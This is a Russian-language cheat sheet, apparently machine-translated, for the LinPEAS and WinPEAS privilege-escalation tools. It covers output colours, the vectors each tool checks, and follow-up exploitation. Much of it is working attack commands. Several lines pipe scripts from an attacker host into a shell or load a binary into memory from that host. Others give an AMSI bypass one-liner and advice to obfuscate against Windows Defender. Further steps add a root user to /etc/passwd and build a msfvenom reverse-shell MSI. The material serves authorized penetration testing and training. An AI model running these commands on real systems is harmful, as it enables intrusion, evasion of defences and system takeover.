<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS и WinPEAS) — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p выравнивание="центр">
  <b>🔍Самые популярные в мире инструменты автоматического повышения привилегий для систем Linux и Windows</b>
</p>

---

## 📋 Содержание

- [Введение](#-введение)
- [Цветовая легенда и способ чтения вывода] (#-color-legend --how-to-read-output)
- [LinPEAS (Повышение привилегий Linux)](#-linpeas-linux-привилегии-эскалация)
  - [Загрузка и выполнение в памяти](#download--in-memory-execution)
  - [Параметры командной строки](#command-line-options)
  - [Основные векторы проверены LinPEAS](#core-vectors-checked-by-linpeas)
  - [Скрытность и уклонение от AV](#stealth--av-evasion)
- [WinPEAS (повышение привилегий Windows)](#-winpeas-windows-привилегии-эскалация)
  - [Методы выполнения (.exe или .bat)](#execution-methods-exe-vs-bat)
  - [Запуск WinPEAS в памяти](#running-winpeas-in-memory)
  - [Основные векторы проверены WinPEAS](#core-vectors-checked-by-winpeas)
  - [Обход Защитника Windows и AMSI](#bypassing-windows-defender--amsi)
- [Интерпретация выводов с высоким приоритетом](#-interpreting-high-priority-finds)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Советы и рекомендации](#-tips--best-practices)
- [Юридическая оговорка](#-юридическая оговорка)
- [Ресурсы](#-ресурсы)

---

## 🎯 Введение

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE — новое поколение), созданный Карлосом Полопом, представляет собой де-факто стандартный набор инструментов автоматического аудита, используемых для выявления векторов повышения привилегий в скомпрометированных системах:

- **LinPEAS:** Универсальный сценарий Bash, который ищет неправильные конфигурации, учетные данные, записываемые файлы, двоичные файлы SUID, эксплойты ядра, задания cron и контейнеры в системах Linux/Unix.
- **WinPEAS:** доступен в виде автономного скомпилированного двоичного файла .NET (`winPEASany.exe`, `winPEASx64.exe`) и облегченного пакетного сценария (`winPEAS.bat`) для аудита рабочих станций Windows, членов домена и серверов.

---

## 🎨 Цветовая легенда и как читать выходные данные

Определяющей силой PEASS является ее автоматизированная система оценки цвета:

| Цвет | Значение | Значение |
|-------|--------------|---------|
| 🔴 **КРАСНЫЙ/ЖЕЛТЫЙ** | 🚨 **КРИТИЧЕСКИЙ (99% PrivEsc)** | Высоконадежный вектор повышения привилегий. Надо срочно проверить! |
| 🔴 **КРАСНЫЙ** | ⚠️ **Интересно** | Необычная конфигурация, настройка не по умолчанию или кандидат на учетные данные. |
| 🟡 **ЖЕЛТЫЙ** | ℹ️ **Информативно** | Заметная находка, которая может быть частью цепочки эксплойтов. |
| 🔵 **ГОЛУБОЙ/СИНИЙ** | 👥 **Контекст** | Пользователи, группы и стандартная системная информация. |

> **Золотое правило:** сначала прокрутите страницу до **КРАСНОГО/ЖЕЛТОГО** фрагмента! Если вы видите текст с желтым фоном и красными буквами, вектор эксплойта почти гарантирован.

---

## 🐧 LinPEAS (повышение привилегий Linux)

### Загрузка и выполнение в памяти

Вам редко понадобится записывать `linpeas.sh` на диск. Выполните его прямо в памяти, используя стандартные утилиты UNIX:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Параметры командной строки
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Основные векторы проверены LinPEAS

1. **Неправильные конфигурации Sudo (`sudo -l`):**
   - Команды выполняются от имени пользователя root без пароля (`NOPASSWD`).
   — Повторное использование токена Sudo / CVE-2021-3156 (Барон Самедит).
2. **Двоичные файлы SUID/SGID:**
   - Бинарники с правами root (`chmod +s`). Перекрестная ссылка на **GTFOBins**.
3. **Возможности Linux:**
   - Двоичные файлы с расширенными возможностями, такие как `cap_setuid+ep` (например, `python3`, `tar`, `perl`).
4. **Запланированные задачи и таймеры:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) и записываемые запланированные сценарии.
   - Системные таймеры (`systemctl list-timers`).
5. **Перехват пути и среды:**
   — Доступные для записи каталоги в `$PATH`, относительный поиск команд в скриптах.
6. **Эксплуатация ядра:**
   — Версия ядра проверена на наличие известных эксплойтов (Dirty COW, Dirty Pipe, OverlayFS).
7. **Раздавливание корней NFS:**
   - Общие каталоги, смонтированные с помощью `no_root_squash` в `/etc/exports`.
8. **Сбор учетных данных:**
   — Пароли в открытом виде в `.bash_history`, файлах конфигурации (`wp-config.php`, `.env`), ключах SSH (`id_rsa`) и дампах памяти.

---

## 🪟 WinPEAS (повышение привилегий Windows)

### Методы выполнения (.exe или .bat)

WinPEAS предоставляется в нескольких форматах:
- **`winPEASx64.exe`/`winPEASany.exe`:** Написано на C#/.NET. Самый полный; выполняет глубокую проверку реестра, API и учетных данных.
- **`winPEAS.bat`:** Обычный пакетный скрипт. Высокая совместимость с устаревшими версиями Windows, не требует никаких зависимостей .NET и позволяет избежать определенных статических двоичных обнаружений.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Запуск WinPEAS в памяти

Чтобы избежать сохранения файлов на диск на проверяемых рабочих станциях, загрузите WinPEAS непосредственно в память PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Основные векторы проверены WinPEAS

1. **Разрешения службы и пути без кавычек:**
   - **Пути к службам без кавычек:** Двоичные пути к службам с пробелами и без кавычек (`C:\Program Files\App\service.exe` -> злоумышленник помещает `C:\Program.exe`).
   - **Слабые разрешения на обслуживание:** пользователи, не являющиеся администраторами, имеющие `SERVICE_ALL_ACCESS` или `SERVICE_CHANGE_CONFIG`.
2. **Перехват DLL:**
   - Службы пытаются загрузить несуществующие библиотеки DLL из каталогов, доступных для записи пользователем.
3. **AlwaysInstallElevated:**
   - Ключи реестра `AlwaysInstallElevated = 1`, позволяющие любому пользователю устанавливать пакеты MSI с повышенными правами с помощью `msiexec`.
4. **Привилегии токена (SeImpersonate/SeAssignPrimaryToken):**
   - Возможность использования с помощью эксплойтов Potato (SweetPotato, GodPotato, PrintSpoofer) для повышения уровня учетных записей служб (`IIS APPPOOL`, `LOCAL SERVICE`) до `NT AUTHORITY\SYSTEM`.
5. **Хранилища учетных данных и автоматический вход:**
   - Пароли в открытом виде в реестре (`DefaultPassword` в Winlogon).
   - Сохраненные соединения RDP, учетные данные Vault, объекты DPAPI, сеансы PuTTY, пароли Wi-Fi.
6. **Файлы резервных копий SAM и SYSTEM:**
   - Доступные для записи или чтения копии `C:\Windows\Repair\SAM` или `C:\Windows\System32\config\RegBack\SAM`.

### Обход Защитника Windows и AMSI

Защитник Windows активно помечает скомпилированные версии `winPEASx64.exe`. Чтобы запустить WinPEAS в контролируемых средах:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Интерпретация высокоприоритетных результатов

### 1. LinPEAS: записываемый `/etc/passwd`
Если LinPEAS помечает `/etc/passwd` **КРАСНЫМ/ЖЕЛТЫМ**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: присутствует `SeImpersonatePrivilege`
Если у вас есть `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` установлен в 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Краткая справочная таблица

| Цель | Команда | Цель |
|--------|---------|---------|
| **Linux (удаленно)** | `curl -L http://<IP>/linpeas.sh \| sh` | Выполнение в памяти без обращения к диску |
| **Linux (локальный)** | `./linpeas.sh -a > out.txt` | Полный аудит сохранен в текстовом файле |
| **Linux (быстрый)** | `./linpeas.sh -q` | Быстрое сканирование с пропуском медленного поиска файлов |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Быстрое исполнение с пониженным уровнем шума |
| **Windows (Память)**| `[System.Reflection.Assembly]::Load($pe)` | Загрузите двоичный файл .NET в память через PowerShell |
| **Windows (пакетный режим)** | `winPEAS.bat` | Выполнение без зависимостей для обхода устаревших/AV |

---

## 💡 Советы и рекомендации

1. **Просмотр вывода с помощью `less -r`:**
   При перенаправлении вывода в файл (`./linpeas.sh > linpeas.txt`) всегда просматривайте его с использованием `less -r linpeas.txt` или `cat linpeas.txt`, чтобы коды цветов ANSI терминала отображались правильно.
2. **Передача через порт 80/443:**
   При установке LinPEAS или WinPEAS на компьютере злоумышленника разместите веб-сервер на порту `80` или `443`, используя `python3 -m http.server 80`, чтобы обойти строгие правила выхода целевого брандмауэра.
3. **Не упускайте из виду скрытые учетные данные:**
   Проверьте разделы «Интересные файлы» и «Облачные учетные данные» выходных данных LinPEAS; часто токены API в виде открытого текста или учетные данные AWS предоставляют более высокие привилегии, чем локальный эксплойт.

---

## ⚠️ Юридическая оговорка

> **ВАЖНО:** Скрипты PEASS-ng выполняют комплексный внутренний аудит и обнаружение конфигурации. Их следует выполнять только в системах, где у вас есть документальное разрешение во время авторизованных тестов на проникновение, упражнений CTF или внутренних аудитов безопасности.

---

## 📚 Ресурсы

- [Официальный репозиторий PEASS-ng на GitHub](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud и Библия повышения привилегий](https://book.hacktricks.xyz/)
- [GTFOBins — Использование двоичных файлов Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows, живущая за счет земли](https://lolbas-project.github.io/)